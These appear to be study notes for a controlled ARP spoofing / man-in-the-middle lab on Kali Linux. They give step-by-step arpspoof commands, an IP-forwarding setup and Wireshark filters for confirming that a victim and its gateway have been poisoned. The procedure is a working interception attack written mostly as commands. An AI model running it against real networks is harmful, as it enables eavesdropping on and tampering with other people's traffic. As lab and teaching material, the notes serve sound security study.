Imp LAP

# Updated ARP Spoofing / MITM Lab Flow

Using Kali Linux and Wireshark

---

# Correct Lab Topology

| Device   | IP                | MAC                 |
| -------- | ----------------- | ------------------- |
| Victim   | `192.168.240.130` | `00:0c:29:31:67:02` |
| Gateway  | `192.168.240.2`   | `00:50:56:f9:37:ee` |
| Attacker | `192.168.240.128` | `00:0c:29:39:2a:a4` |

---

# 1. Check Attacker Interface

Run on attacker:

```bash id="m7q2vp"
ip a
```

Verify:

```text id="x4m8qn"
Interface : eth0
IP        : 192.168.240.128
MAC       : 00:0c:29:39:2a:a4
```

---

# 2. Verify Connectivity

Run on attacker:

```bash id="p9r3tw"
ping 192.168.240.130
ping 192.168.240.2
```

Purpose:

* Verify victim reachable
* Verify gateway reachable

---

# 3. View ARP Table

Run on attacker:

```bash id="k6x1mp"
arp -a
```

Expected:

```text id="j2q7vx"
192.168.240.130 → 00:0c:29:31:67:02
192.168.240.2   → 00:50:56:f9:37:ee
```

---

# 4. Flush ARP Cache

Run on attacker:

```bash id="w5m4pn"
sudo ip neigh flush all
```

Purpose:

* Clear old ARP entries
* Force new ARP requests

---

# 5. Enable IP Forwarding

Check current status:

```bash id="f8r2ql"
cat /proc/sys/net/ipv4/ip_forward
```

If output:

```text id="b3x9tw"
0
```

Enable forwarding:

```bash id="q4m7vx"
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

Verify:

```bash id="n1r5tw"
cat /proc/sys/net/ipv4/ip_forward
```

Expected:

```text id="r6m2pk"
1
```

---

# 6. Terminal 1 — Victim Direction

Run on attacker:

```bash id="t8x4qn"
sudo arpspoof -i eth0 -t 192.168.240.130 192.168.240.2
```

Meaning:

```text id="u3q7vl"
Tell victim (.130) that gateway (.2) is attacker MAC
```

---

# 7. Terminal 2 — Gateway Direction

Run on attacker:

```bash id="c5m1wr"
sudo arpspoof -i eth0 -t 192.168.240.2 192.168.240.130
```

Meaning:

```text id="z9r4pn"
Tell gateway (.2) that victim (.130) is attacker MAC
```

---

# 8. Expected Traffic Flow

```text id="h2q8mx"
Victim (.130)
      ↓
Attacker (.128)
      ↓
Gateway (.2)
```

---

# 9. Verify on Victim

Run on victim:

```bash id="g7m5qw"
arp -a
```

Expected poisoned entry:

```text id="v4m1pk"
192.168.240.2 → 00:0c:29:39:2a:a4
```

instead of real gateway MAC:

```text id="p6q7tw"
00:50:56:f9:37:ee
```

---

# 10. Verify on Gateway

Run on gateway:

```bash id="y3m8vr"
arp -a
```

Expected:

```text id="l5q1pn"
192.168.240.130 → 00:0c:29:39:2a:a4
```

instead of victim MAC:

```text id="d8x4tw"
00:0c:29:31:67:02
```

---

# 11. Monitor Using Wireshark

Capture on:

```text id="s2m7qp"
eth0
```

Useful Filters:

## ARP Packets

```text id="f6r9pk"
arp
```

## Victim Traffic

```text id="w1m4qn"
ip.addr == 192.168.240.130
```

## Gateway Traffic

```text id="q7x3vn"
ip.addr == 192.168.240.2
```

## Duplicate ARP Detection

```text id="a4m8pk"
arp.duplicate-address-detected
```

---

# 12. Disable IP Forwarding After Lab

Run on attacker:

```bash id="e9q2tw"
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

# One-Line Summary

> The attacker machine `192.168.240.128` enables IP forwarding and causes victim `192.168.240.130` and gateway `192.168.240.2` to associate attacker MAC `00:0c:29:39:2a:a4` with each other’s IPs during the controlled MITM lab demonstration.
